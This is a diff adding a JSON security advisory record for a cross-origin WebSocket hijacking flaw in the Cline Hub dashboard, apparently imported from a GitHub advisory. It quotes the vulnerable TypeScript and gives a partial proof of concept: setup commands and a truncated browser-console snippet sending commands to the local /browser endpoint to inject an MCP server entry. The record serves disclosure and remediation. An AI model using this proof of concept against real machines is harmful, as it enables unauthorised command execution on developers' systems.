@@ -1,0 +1,70 @@
+{
+  "schema_version": "0.1.0",
+  "id": "AGT-2026-0037",
+  "modified": "2026-09-24T20:00:05.119187992Z",
+  "published": "2026-09-24T19:48:34Z",
+  "aliases": [
+    "GHSA-3cj3-hqcr-g934",
+    "CVE-2026-59723"
+  ],
+  "summary": "Cline: Cross-Origin WebSocket Hijacking in Cline Hub Dashboard (`/browser` endpoint)",
+  "details": "### Summary\n\nThe Cline Hub dashboard server (`@cline/cline-hub`), launched via the `cline dashboard` CLI command, accepts WebSocket connections on the `/browser` endpoint without validating the HTTP `Origin` header. When `ROOM_SECRET` is not set—the default for local (`127.0.0.1`) binds—`isAuthorizedBrowserRequest()` returns `true` unconditionally, allowing any website a developer visits to open a cross-origin WebSocket to `ws://127.0.0.1:8787/browser`. An attacker-controlled page can then send `desktopCommand` frames to read workspace/session state, mutate MCP and provider settings, and—because dashboard sessions default to `autoApprove: true` for all tools—trigger arbitrary command execution when a provider/model is configured. Dynamically confirmed: an `upsert_mcp_server` frame injected a malicious `stdio` MCP server entry into the victim's Cline settings file with `ok: true` response.\n\n### Details\n\nThe vulnerable code path spans multiple files in the `apps/cline-hub` workspace.\n\n**No secret by default (local bind)**\n\n`apps/cline-hub/src/options.ts:54–57` converts an empty `ROOM_SECRET` environment variable to `undefined`:\n\n```ts\n// apps/cline-hub/src/options.ts:54\nfunction normalizeRoomSecret(value: string | undefined): string | undefined {\n    const secret = value?.trim();\n    return secret ? secret : undefined;\n}\n```\n\n`apps/cline-hub/src/options.ts:67–85` allows the local default host (`127.0.0.1`) to start without a secret, so `roomSecret` remains `undefined` in the default configuration.\n\n**Authorization bypass — Origin not checked**\n\n`apps/cline-hub/src/server.ts:61–64` short-circuits all authorization when `roomSecret` is `undefined`, and performs no `Origin` header check at any point:\n\n```ts\n// apps/cline-hub/src/server.ts:61\nfunction isAuthorizedBrowserRequest(url: URL): boolean {\n    if (!roomSecret) return true;\n    return url.searchParams.get(\"roomSecret\") === roomSecret;\n}\n```\n\n**WebSocket upgrade without Origin validation**\n\n`apps/cline-hub/src/server.ts:86–97` upgrades any request to `/browser` without inspecting the `Origin` header:\n\n```ts\n// apps/cline-hub/src/server.ts:86\nif (url.pathname === \"/browser\") {\n    if (!isAuthorizedBrowserRequest(url)) {\n        return createJsonResponse({ error: \"invalid_room_secret\" }, 401);\n    }\n    if (server.upgrade(req, { data })) return undefined;\n}\n```\n\nBrowsers enforce the Same-Origin Policy for fetch/XHR but not for WebSocket connections—they always include the `Origin` header but leave enforcement to the server. Because the server ignores `Origin`, any cross-origin JavaScript can connect.\n\n**Auto-approve tool policy for dashboard sessions**\n\n`apps/cline-hub/src/server/sessions.ts:129–133` sets the default tool policy to auto-approve all tools for new dashboard sessions:\n\n```ts\n// apps/cline-hub/src/server/sessions.ts:129\ntoolPolicies:\n    options?.autoApproveTools === false\n        ? { \"*\": { autoApprove: false } }\n        : { \"*\": { autoApprove: true } },\n```\n\n**MCP settings write sink**\n\n`apps/cline-hub/src/server/desktop-commands.ts:180–185` processes `upsert_mcp_server` commands without additional authorization. `apps/cline-hub/src/server/mcp.ts:101–136` writes arbitrary `stdio` command entries to `$CLINE_DATA_DIR/settings/cline_mcp_settings.json`, which Cline executes when the MCP server is next activated.\n\n### PoC\n\n**Prerequisites**\n\n- `cline` version 3.0.24 installed globally\n- A browser (or any WebSocket client) running on the same machine as the victim\n\n**Setup**\n\n```bash\nnpm i -g cline@3.0.24\nexport CLINE_DATA_DIR=\"$(mktemp -d)\"\ncline dashboard --no-open\n# Default: HOST=127.0.0.1, PORT=8787, ROOM_SECRET unset\n```\n\n**Exploit (browser console on any cross-origin page)**\n\nOpen any non-Cline website in the browser and paste the following into the DevTools console while the dashboard is running:\n\n```js\nconst ws = new WebSocket(\"ws://127.0.0.1:8787/browser\");\nws.onopen = () => {\n  ws.send(JSON.stringify({\n    type: \"desktopCommand\",\n    id: \"poc-mcp-write\",\n    \n\nImported from OSV GHSA-3cj3-hqcr-g934.",
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://osv.dev/vulnerability/GHSA-3cj3-hqcr-g934"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cline/cline/security/advisories/GHSA-3cj3-hqcr-g934"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59723"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cline/cline/pull/11724"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cline/cline/commit/d09270940f5746f288cfc4a5039b46a2f4d5d01e"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cline/cline"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cline/cline/releases/tag/cli-v3.0.30"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "cline"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.30"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "artifact_type": "package",
+    "classification": "vulnerable",
+    "verification": "verified",
+    "reporter": "osv-import",
+    "severity": "high"
+  }
+}
